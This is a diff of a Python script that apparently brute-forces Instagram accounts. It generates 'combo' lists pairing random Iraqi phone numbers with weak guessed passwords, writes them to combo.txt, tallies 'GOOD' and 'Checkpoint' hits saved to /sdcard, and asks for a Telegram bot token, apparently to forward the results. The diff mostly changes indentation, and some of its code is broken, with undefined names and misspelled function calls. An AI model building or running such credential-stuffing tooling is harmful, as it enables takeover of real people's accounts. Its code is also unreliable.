@@ -279,8 +279,8 @@ def instagram2():
 					print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 		except FileNotFoundError:
 			print(" [ ! comboka la mobilet a nia ean Path halaya ! ]")
-    loopPp()
-    print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
+	loopPp()
+	print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
 ################################################################################################
 ################################################################################################
 
@@ -368,8 +368,8 @@ def instagram3():
 					print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 		except FileNotFoundError:
 			print(" [ ! comboka la mobilet a nia ean Path halaya ! ]")
-    loopPp()
-    print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
+	loopPp()
+	print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
 ################################################################################################
 ################################################################################################
 ################################################################################################
@@ -384,28 +384,28 @@ def instagram4():
 	import requests
 	from user_agent import generate_user_agent
 	from datetime import datetime
-	r = requests.session()    
-    for loll in range(10000):
-        sys.stdout=open("combo.txt", "a")
-        r=random.randint(1000000, 9999999)
-        rr=random.randint(1000000, 9999999)
-        rrr=random.randint(1000000, 9999999)
-        rrrr=random.randint(1000000, 9999999)
-        rrrrr=random.randint(1000000, 9999999)
-        rrrrrr=random.randint(1000000, 9999999)
-        print("+964770"+str(r)+":"+str(r))
-        print("+964750"+str(rr)+":"+str(rr))
-        print("+964770"+str(rrr)+":0770"+str(rrr))
-        print("+964750"+str(rrrr)+":1234512345")
-        print("+964750"+str(rrrrr)+":123456123456")
-        print("+964750"+str(rrrrrr)+":1122334455")
-    if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-        ID=input("    Your ID Telegram :")
-        token=input("    Token(bot) : ")
-    elif iagar=='n' or agar=='no' or agar=='N' or agar=='NO' or agar=='No':
-        pass
-    else:
-        pass
+	r = requests.session()
+	for loll in range(10000):
+		sys.stdout=open("combo.txt", "a")
+		r=random.randint(1000000, 9999999)
+		rr=random.randint(1000000, 9999999)
+		rrr=random.randint(1000000, 9999999)
+		rrrr=random.randint(1000000, 9999999)
+		rrrrr=random.randint(1000000, 9999999)
+		rrrrrr=random.randint(1000000, 9999999)
+		print("+964770"+str(r)+":"+str(r))
+		print("+964750"+str(rr)+":"+str(rr))
+		print("+964770"+str(rrr)+":0770"+str(rrr))
+		print("+964750"+str(rrrr)+":1234512345")
+		print("+964750"+str(rrrrr)+":123456123456")
+		print("+964750"+str(rrrrrr)+":1122334455")
+	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
+		ID=input("    Your ID Telegram :")
+		token=input("    Token(bot) : ")
+	elif iagar=='n' or agar=='no' or agar=='N' or agar=='NO' or agar=='No':
+		pass
+	else:
+		pass
 	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
 	def loopPp():
 		try:
@@ -481,8 +481,8 @@ def instagram4():
 					print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 		except FileNotFoundError:
 			print(" [ ! comboka la mobilet a nia ean Path halaya ! ]")
-    loopPp()
-    print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
+	loopPp()
+	print("\n\n   It's Over !\n  File saved : /sdcard/[hits or checkpoint].txt")
 ################################################################################################
 ################################################################################################
 ################################################################################################################################################################################################
@@ -491,10 +491,8 @@ def instagram4():
 ###############################################################
 def i1():
     if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-    ID=input("    Your ID Telegram :")
-    token=input("    Token(bot) : ")
-    elif iagar=='n' or agar=='no' or agar=='N' or agar=='NO' or agar=='No':
-        instgram1()
+    	ID=input("    Your ID Telegram :")
+    	token=input("    Token(bot) : ")
     else:
         instgram1()
 def i2():
@@ -506,48 +504,25 @@ def i2():
         print("+964770"+str(r)+":"+str(r))
         print("+964750"+str(rr)+":"+str(rr))
     if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-        ID=input("    Your ID Telegram :")
-        token=input("    Token(bot) : ")
-    elif iagar=='n' or agar=='no' or agar=='N' or agar=='NO' or agar=='No':
-    instgram2()
+    	ID=input("    Your ID Telegram :")
+    	token=input("    Token(bot) : ")
     else:
         instgram2()
 def i3():
-    for loll in range(10000):
-        sys.stdout=open("combo.txt", "a")
-        r=random.randint(1000000, 9999999)
-        rr=random.randint(1000000, 9999999)
-        print("+964770"+str(r)+":0770"+str(r))
-        print("+964750"+str(rr)+":0750"+str(rr))
-    if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-        ID=input("    Your ID Telegram :")
-        token=input("    Token(bot) : ")
-    elif iagar=='n' or agar=='no' or agar=='N' or agar=='NO' or agar=='No':
-        instagram3()
-    else:
-        instagram3()
-def i4():
-    for loll in range(10000):
-    sys.stdout=open("combo.txt", "a")
-    r=random.randint(1000000, 9999999)
-    rr=random.randint(1000000, 9999999)
-    rrr=random.randint(1000000, 9999999)
-    rrrr=random.randint(1000000, 9999999)
-    rrrrr=random.randint(1000000, 9999999)
-    rrrrrr=random.randint(1000000, 9999999)
-    print("+964770"+str(r)+":"+str(r))
-    print("+964750"+str(rr)+":"+str(rr))
-    print("+964770"+str(rrr)+":0770"+str(rrr))
-    print("+964750"+str(rrrr)+":1234512345")
-    print("+964750"+str(rrrrr)+":123456123456")
-    print("+964750"+str(rrrrrr)+":1122334455")
-    if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
-        ID=input("    Your ID Telegram :")
-        token=input("    Token(bot) : ")
-    elif iagar=='n' or agar=='no' or agar=='N' or agar=='NO' or agar=='No':
-        instgram4()
-    else:
-        instgram4()
+	for loll in range(10000):
+		import sys
+		sys.stdout=open("combo.txt", "a")
+		r=random.randint(1000000, 9999999)
+		rr=random.randint(1000000, 9999999)
+		print("+964770"+str(r)+":0770"+str(r))
+		print("+964750"+str(rr)+":0750"+str(rr))
+	if agar=='y' or agar=='yes' or agar=='Y' or agar=='YES' or agar=='Yes':
+	 	ID=input("    Your ID Telegram :")
+	 	token=input("    Token(bot) : ")
+	else:
+	 	instagram3()
+    
+     
 def dwbara():
     import json, requests, user_agent,os ,sys, time, datetime
     logo=(W+G+'''
